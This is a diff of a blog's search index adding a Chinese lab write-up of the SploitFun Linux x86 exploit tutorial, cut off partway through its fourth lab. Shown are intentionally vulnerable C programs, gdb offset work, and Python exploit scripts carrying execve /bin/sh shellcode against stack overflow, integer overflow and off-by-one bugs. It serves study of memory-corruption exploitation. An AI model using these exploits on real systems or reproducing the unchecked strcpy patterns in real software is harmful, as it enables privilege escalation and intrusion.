@@ -1286,8 +1286,290 @@
       </tags>
   </entry>
   <entry>
-    <title>SploitFun Linux x86 Exploit 开发系列教程 学习</title>
-    <url>/2021/07/30/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
+    <title>《SploitFun Linux x86 Exploit 开发系列教程》学习</title>
+    <url>/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p><strong>0x00：</strong></p>
+<p>其实这篇博客是后来上传的了，这居然是我们的网络攻防实验课的作业，当时我选的方向是二进制，《SploitFun Linux x86 Exploit 开发系列教程》这书确实不错，很多基本的二进制漏洞都有了，吐槽下：<strong>就是书里面很多二进制漏洞都是用的内存中的绝对地址，这意味着你要自己调试知道地址是多少</strong>，还有坑就是如果在你的环境下调试出来的地址<strong>带有/x00之类的截断字符</strong>，就有可能被截断，然后实验不成功。这里只有前7个实验，实验8未成功，以及之后堆的实验都是<strong>需要一定的环境才能复现，有些漏洞现在早已不能使用</strong>，建议直接使用ctf题目学习。</p>
+<h1 id="实验一典型的基于堆栈的缓冲区溢出"><a class="markdownIt-Anchor" href="#实验一典型的基于堆栈的缓冲区溢出"></a> 实验一：典型的基于堆栈的缓冲区溢出</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<p>什么是缓冲区溢出？ 将源缓冲区复制到目标缓冲区可能导致溢出</p>
+<p>1、源字符串长度大于目标字符串长度。</p>
+<p>2、不进行大小检查。</p>
+<p>缓冲区溢出有两种类型：</p>
+<p>1、基于堆栈的缓冲区溢出 - 这里的目标缓冲区位于堆栈中</p>
+<p>2、基于堆的缓冲区溢出 - 这里的目标缓冲区位于堆中</p>
+<p>漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-comment">/* [1] */</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-comment">/* [2] */</span> <span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">/* [3] */</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input:%s\n&quot;</span>,buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="1使用ubuntu1204x86版本进行编译"><a class="markdownIt-Anchor" href="#1使用ubuntu1204x86版本进行编译"></a> 1.使用Ubuntu12.04（x86）版本进行编译</h2>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730165935638.png" alt="image-20210730165935638" style="zoom:80%;">
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170014233.png" alt="image-20210730170014233" style="zoom:80%;">
+<h2 id="2查看程序里的堆栈布局"><a class="markdownIt-Anchor" href="#2查看程序里的堆栈布局"></a> 2.查看程序里的堆栈布局</h2>
+<p>gdb调试输入disassemble main</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170048792.png" alt="image-20210730170048792" style="zoom:80%;">
+<h2 id="3测试是否能覆盖返回地址"><a class="markdownIt-Anchor" href="#3测试是否能覆盖返回地址"></a> 3.测试是否能覆盖返回地址</h2>
+<p>先通过python输入大量的A</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170137935.png" alt="image-20210730170137935" style="zoom:80%;">
+<p>然后通过gdb查看此时eip的地址</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170157849.png" alt="image-20210730170157849" style="zoom:80%;">
+<p>可以看到此时eip的地址为0x41414141，41为A在内存里的值，所以eip的地址被输入的A覆盖了。</p>
+<h2 id="4准确覆盖返回地址测试"><a class="markdownIt-Anchor" href="#4准确覆盖返回地址测试"></a> 4.准确覆盖返回地址测试</h2>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170220140.png" alt="image-20210730170220140" style="zoom:80%;">
+<p>我们可以知道返回地址的位置是0x100+0x8+0x4=0x10c</p>
+<p>其中</p>
+<p>0x100 是 ‘buf’ 的大小 0x8 是 对齐空间 0x4 是调用者的ebp</p>
+<p>这时候我们可以测试输入268<em>A和4</em>B，我们就可以吧返回地址覆盖成0x42424242</p>
+<p>Gdb调试测试如下：</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170248840.png" alt="image-20210730170248840" style="zoom:80%;">
+<p>可以看到重新调试之后，eip的地址覆盖成了0x42424242</p>
+<h2 id="5构建exp攻击"><a class="markdownIt-Anchor" href="#5构建exp攻击"></a> 5.构建exp攻击</h2>
+<p>首先我们得知道buf的地址，我们先把攻击的的脚本用来输入，再使用gdb调试看返回地址的位置</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170515205.png" alt="image-20210730170515205" style="zoom:80%;">
+<p>然后查看栈中shellcode的返回的位置</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170531756.png" alt="image-20210730170531756" style="zoom:80%;">
+<p>*ret_addr可以为&quot;\x90&quot;中任意一个地址，&quot;\x90&quot;在shellcode为nop空操作</p>
+<p>找到shellcode的位置是0xbffff224，然后将攻击脚本中ret_addr改为0xbffff220</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170611805.png" alt="image-20210730170611805" style="zoom:80%;">
+<p>运行即可成功拿到root shell</p>
+<h1 id="实验二整数溢出"><a class="markdownIt-Anchor" href="#实验二整数溢出"></a> 实验二：整数溢出</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1-原理"><a class="markdownIt-Anchor" href="#1-原理"></a> 1. 原理</h2>
+<p>什么是整数溢出？</p>
+<p>存储大于最大支持值的值称为整数溢出。整数溢出本身不会导致任意代码执行，但整数溢出可能会导致堆栈溢出或堆溢出，这可能导致任意代码执行。</p>
+<p>数据类型大小及范围：</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170757200.png" alt="image-20210730170757200" style="zoom:80%;">                               
+<p>当我们试图存储一个大于最大支持值的值时，我们的值会被包装 。例如，当我们尝 试将 2147483648 存储到带符号的 int 数据类型时，它将被包装并存储 为 -21471483648 。这被称为整数溢出，这种溢出可能导致任意代码执行 整数下溢 类似地，存储小于最小支持值的值称为整数下溢。例如，当我们尝试 将 -2147483649 存储到带符号的int数据类型时，它将被包装并存储 为 21471483647 .这称为整数下溢。在这里我只会谈论整数溢出，但是这个过程对 于下溢也是一样的！</p>
+<p>漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">store_passwd_indb</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_uname</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* uname)</span> </span>&#123;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">validate_passwd</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* passwd)</span> </span>&#123;<br><span class="hljs-keyword">char</span> passwd_buf[<span class="hljs-number">11</span>];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> passwd_len = <span class="hljs-built_in">strlen</span>(passwd); <span class="hljs-comment">/* [1] */</span><br><span class="hljs-keyword">if</span>(passwd_len &gt;= <span class="hljs-number">4</span> &amp;&amp; passwd_len &lt;= <span class="hljs-number">8</span>) &#123; <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Valid Password\n&quot;</span>); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">strcpy</span>(passwd_buf,passwd); <span class="hljs-comment">/* [4] */</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid Password\n&quot;</span>); <span class="hljs-comment">/* [5] */</span><br>fflush(<span class="hljs-built_in">stdout</span>);<br>&#125;<br>store_passwd_indb(passwd_buf); <span class="hljs-comment">/* [6] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">3</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage Error: \n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>validate_uname(argv[<span class="hljs-number">1</span>]);<br>validate_passwd(argv[<span class="hljs-number">2</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="2-编译以及溢出点"><a class="markdownIt-Anchor" href="#2-编译以及溢出点"></a> 2. 编译以及溢出点</h2>
+<p>编译指令</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170859269.png" alt="image-20210730170859269" style="zoom:80%;">
+<p>漏洞代码中上述漏洞代码的 [1] 行显示了一个整数溢出错误。 strlen 的返回类型</p>
+<p>是 size_t （ unsigned int ），它存储在 unsigned char 数据类型中。因</p>
+<p>此，任何大于 unsigned char 的最大支持值的值都会导致整数溢出。因此当密码</p>
+<p>整数溢出长度为261时，261将被包裹并存储为 passwd_len 变量中的5！由于这个整数溢出，可以绕过行 [2] 执行的边界检查，从而导致基于堆栈的缓冲区溢出！</p>
+<h2 id="3-堆栈和溢出测试"><a class="markdownIt-Anchor" href="#3-堆栈和溢出测试"></a> 3. 堆栈和溢出测试</h2>
+<p>用gdb查看堆栈</p>
+<pre><code>                                                      &lt;img src=&quot;image-20210730170924024.png&quot; alt=&quot;image-20210730170924024&quot; style=&quot;zoom:80%;&quot; /&gt;
+</code></pre>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730170955621.png" alt="image-20210730170955621" style="zoom:80%;">
+<p>此时堆栈结构为</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171019424.png" alt="image-20210730171019424" style="zoom:80%;">
+<p>测试1：是否可以覆盖返回地址？</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171129071.png" alt="image-20210730171129071" style="zoom:80%;">
+<p>输入261个A后可以看到返回地址确实成了0x41414141</p>
+<p>测试2：目的缓冲区的偏移量是多少？</p>
+<p>这里让我们从缓冲区 passwd_buf 中找出什么偏移返回地址。反汇编并绘制了 validate_passwd 的堆栈布局，现在可以尝试找到偏移位置信息！堆栈布局显 示返回地址位于缓冲区 passwd_buf 的偏移（ 0x18 ）处。 0x18 计算如下：</p>
+<p>0xb ：passwd_buf 的大小</p>
+<p>0x1： passwd_len 的大小</p>
+<p>0x4：对齐空间</p>
+<p>0x4：edi</p>
+<p>0x4：调用者的ebp</p>
+<p>测试输入&quot;A&quot; * 24 + “B” * 4 + “C” * 233，用B覆盖返回地址</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171149653.png" alt="image-20210730171149653" style="zoom:80%;">
+<p>测试返回地址被覆盖成了0x42424242，说明判断是对的</p>
+<h2 id="4构建exp攻击"><a class="markdownIt-Anchor" href="#4构建exp攻击"></a> 4.构建exp攻击</h2>
+<p>通过查看内存可以找到</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171203079.png" alt="image-20210730171203079" style="zoom:80%;">
+<p>返回地址的位置在0xbffff20c开始处</p>
+<p>我们的攻击脚本中返回地址的选取是在这个返回地址后的100个“\x90”中</p>
+<p>我们随机选取一个地址0xbffff240攻击脚本改为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br>arg1 = <span class="hljs-string">&quot;sploitfun&quot;</span><br><span class="hljs-comment">#Stack address where shellcode is copied.</span><br>ret_addr = <span class="hljs-number">0xbffff240</span><br><span class="hljs-comment">#Spawn a shell</span><br><span class="hljs-comment">#execve(/bin/sh)</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="hljs-comment">#endianess convertion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode</span><br>arg2 = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">24</span><br>arg2 += conv(ret_addr);<br>arg2 += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">100</span><br>arg2 += scode<br>arg2 += <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">108</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Calling vulnerable program&quot;</span><br>call([<span class="hljs-string">&quot;./vuln&quot;</span>, arg1, arg2])<br><span class="hljs-built_in">print</span> arg2<br> <br></code></pre></td></tr></table></figure>
+<p>运行测试可以得到rootshell</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171301037.png" alt="image-20210730171301037" style="zoom:80%;">
+<h1 id="实验三off-by-one-漏洞基于栈"><a class="markdownIt-Anchor" href="#实验三off-by-one-漏洞基于栈"></a> 实验三：Off-By-One 漏洞（基于栈）</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1-原理-2"><a class="markdownIt-Anchor" href="#1-原理-2"></a> 1. 原理</h2>
+<p><strong>什么是off by one？</strong></p>
+<p>将源字符串复制到目标缓冲区可能会导致off by one 1、源字符串长度等于目标缓冲区长度。 当源字符串长度等于目标缓冲区长度时，单个 NULL 字节将被复制到目标缓冲区上 方。这里由于目标缓冲区位于堆栈中，所以单个 NULL 字节可以覆盖存储在堆栈中 的调用者的EBP的最低有效位（LSB），这可能导致任意的代码执行。<br>
+漏洞代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br>bar(arg); <span class="hljs-comment">/* [1] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* arg)</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br><span class="hljs-built_in">strcpy</span>(buf, arg); <span class="hljs-comment">/* [2] */</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span> </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>])&gt;<span class="hljs-number">256</span>) &#123; <span class="hljs-comment">/* [3] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Attempted Buffer Overflow\n&quot;</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>foo(argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [4] */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure>
+<h2 id="2-编译以及溢出点-2"><a class="markdownIt-Anchor" href="#2-编译以及溢出点-2"></a> 2. 编译以及溢出点</h2>
+<p><strong>编译指令：</strong></p>
+   <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171628517.png" alt="image-20210730171628517" style="zoom:80%;">                       
+<p>上述漏洞代码的第 [2] 行是可能发生off by one溢出的地方。目标缓冲区长度为 256，因此长度为256字节的源字符串可能导致任意代码执行。 如何执行任意代码执行？ 使用称为“EBP覆盖”的技术实现任意代码执行。如果调用者的EBP位于目标缓冲区 之上，则在 strcpy 之后，单个 NULL 字节将覆盖调用者EBP的LSB。</p>
+<p>用gdb查看堆栈布局</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171655079.png" alt="image-20210730171655079" style="zoom:80%;">
+<p>通过这样我们得到的堆栈布局是</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171725012.png" alt="image-20210730171725012" style="zoom:80%;">
+<p>这样的</p>
+<p>当我们已经知道256字节的用户输入，用空字节可以覆盖 foo 的EBP的LSB。所以 当 foo 的存储在目标缓冲区 buf 之上的EBP被一个 NULL（“\x00”） 字节所覆盖时，ebp 从 0xbffff2d8 变为 0xbffff200 。从堆栈布局我们可以看到堆栈位 置 0xbffff200 是目标缓冲区 buf 的一部分，由于用户输入被复制到该目标缓冲 区，攻击者可以控制这个堆栈位置（ 0xbffff200 ），因此他控制指令指针（eip ）使用他可以实现任意代码执行。</p>
+<h2 id="3溢出测试"><a class="markdownIt-Anchor" href="#3溢出测试"></a> 3．溢出测试</h2>
+<p>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址</p>
+<p>测试输入256个“A”</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171746339.png" alt="image-20210730171746339" style="zoom:80%;">
+<p>可以看到eip被覆盖成了0x41414141</p>
+<p>测试步骤2：距离目标缓冲区的偏移是多少？</p>
+<p>现在，我们可以从目标缓冲区 buf 的起始位置开始找到偏移量，我们需要替换我们的返回地址。记住在off by one 漏洞中，我们不会覆盖堆栈中存储的实际返回地址（像我们在基于堆栈的缓冲区溢出中），而是攻击者控制的目标缓冲区 buf 内的4字节内存区域将被视为返回地址位置（在off by one溢出之后）。因此，我们需要找到这个返回地址位置偏移量（从 buf ），它是目标缓冲区 buf 本身的一部分</p>
+<p>通过调试，输入256个a，gdb查看内存发现在0xbffff218位置的ebp的值被覆盖成了0xbffff200</p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/Users\17473\Desktop\博客\SploitFun Linux x86 Exploit 开发系列教程\image-20210730171807528.png" alt="image-20210730171807528" style="zoom:80%;">
+<p>如果ebp的地址为0xbffff200，那我们就知道eip的位置应该为0xbffff204</p>
+<p>这个位置距离buf起始位置是0x204-0x118=236，所以我们输入的236个A后面的数就可以覆盖到eip指针</p>
+<p>尝试输入</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span> `python -c &#x27;print <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">236</span>+<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;C&quot;</span>*<span class="hljs-number">16</span>&#x27;`<br></code></pre></td></tr></table></figure>
+<p>此时的内存空间如下</p>
+<img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730171936781.png" alt="image-20210730171936781" style="zoom:80%;">
+<p>这个时候0xbffff204的位置刚好被覆盖成了0x42424242，继续运行程序发现eip指针变成了0x42424242</p>
+<h2 id="4构建exp"><a class="markdownIt-Anchor" href="#4构建exp"></a> 4.构建exp</h2>
+<p>根据上面测试的内容，我们可以构建这样的exp：</p>
+<p>返回地址设定为0xbffff180，buf里的内容先是输入100个A（这时buf应该在0xbffff170左右）然后再接上30个nop指令和shellcode，构建如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> call<br><span class="hljs-comment">#Spawn a shell.</span><br><span class="hljs-comment">#execve(/bin/sh) Size- 28 bytes.</span><br>scode = <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90&quot;</span><br>ret_addr = <span class="hljs-number">0xbffff180</span><br><span class="hljs-comment">#endianess conversion</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">conv</span>(<span class="hljs-params">num</span>):</span><br> <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>,num)<span class="hljs-comment">#nk + RA + NOP&#x27;s + Shellcode+junk</span><br>buf = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br>buf += <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">30</span><br>buf += scode<br>buf += <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">78</span><br>buf += conv(ret_addr)<br>buf += <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">16</span><br><span class="hljs-comment">#print &quot;Calling vulnerable program&quot;</span><br><span class="hljs-built_in">print</span> buf<br><span class="hljs-comment">#call([&quot;./vuln&quot;, buf])</span><br><br></code></pre></td></tr></table></figure>
+<p>使用gdb调试，然后输入此exp可以拿到rootshell</p>
+<p>*<strong>理论是正确的，直接运行我就拿不到，不知道为什么</strong></p>
+ <img src="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/image-20210730172617549.png" alt="image-20210730172617549" style="zoom:80%;">
+<h1 id="实验四使用-return-to-libc-绕过-nx-位"><a class="markdownIt-Anchor" href="#实验四使用-return-to-libc-绕过-nx-位"></a> 实验四：使用 return-to-libc 绕过 NX 位</h1>
+<p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p>
+<p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p>
+<h2 id="1-原理-3"><a class="markdownIt-Anchor" href="#1-原理-3"></a> 1． 原理</h2>
+<p>在以前的帖子中，我们看到了这个攻击者复制shellcode堆栈并跳转到它！ 为了成功利用漏洞代码。为了阻止攻击者的行动，安全研究人员提出了一个名 为“NX 位”的漏洞缓解！</p>
+<p><strong>什么是NX 位？</strong></p>
+<p>它是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。示 例：使数据，堆栈和堆段不可执行，而代码段不可写。 在NX 位打开的情况下，我们基于堆栈的缓冲区溢出的经典方法将无法利用此漏洞。因为在经典的方法中，shellcode被复制到堆栈中，返回地址指向shellcode。 但是现在由于堆栈不再可执行，我们的漏洞利用失败！</p>
+<p>漏洞代码：此代码与以前发布的漏洞代码相同，稍作修改。稍后我会谈谈需要修改的内容。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>]; <span class="hljs-comment">/* [1] */</span><br><span class="hljs-built_in">strcpy</span>(buf,argv[<span class="hljs-number">1</span>]); <span class="hljs-comment">/* [2] */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,buf); <span class="hljs-comment">/* [3] */</span><br>fflush(<span class="hljs-built_in">stdout</span>); <span 